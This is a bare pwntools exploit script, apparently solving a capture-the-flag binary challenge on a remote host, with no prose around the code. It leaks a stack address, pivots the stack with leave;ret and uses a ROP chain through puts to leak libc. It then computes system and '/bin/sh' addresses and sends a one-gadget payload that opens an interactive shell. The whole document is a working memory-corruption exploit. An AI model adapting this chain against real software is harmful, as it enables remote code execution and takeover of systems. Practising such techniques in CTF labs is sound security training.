from pwn import *
#context.log_level="debug"

sh=remote("node5.buuoj.cn",25725)
elf=ELF("./timu")
libc=ELF("./libc-2.27.so")

pop_rdi_ret=0x0000000000400ad3
leave_ret=0x0000000000400a18
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main=0x00000000004008F6

sh.sendline(b"224")
sh.recvuntil(b"Your message will be saved at 0x")
stack=sh.recv(12)
stack=int(stack,16)
print("stack=",hex(stack))

payload=0x8*b'a'+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0xd0,b'a')
payload=payload+p64(stack)+p64(leave_ret)
sh.send(payload)

sh.recvuntil(b"Byebye~\n")
puts_addr=u64(sh.recv(6).ljust(8,b"\x00"))
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh\x00"))

sleep(4)

sh.sendline(b"224")
sh.recvuntil(b"Your message will be saved at 0x")
stack=sh.recv(12)
stack=int(stack,16)
print("stack=",hex(stack))

"""
payload=0x8*b'a'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(main)
payload=payload.ljust(0xd0,b'a')
payload=payload+p64(stack)+p64(leave_ret)
sh.send(payload)
"""

onegadget=libc_base+0x4f2c5
payload=0x8*b'a'+p64(onegadget)
payload=payload.ljust(0xd0,b'a')
payload=payload+p64(stack)+p64(leave_ret)
sh.send(payload)

sh.interactive()
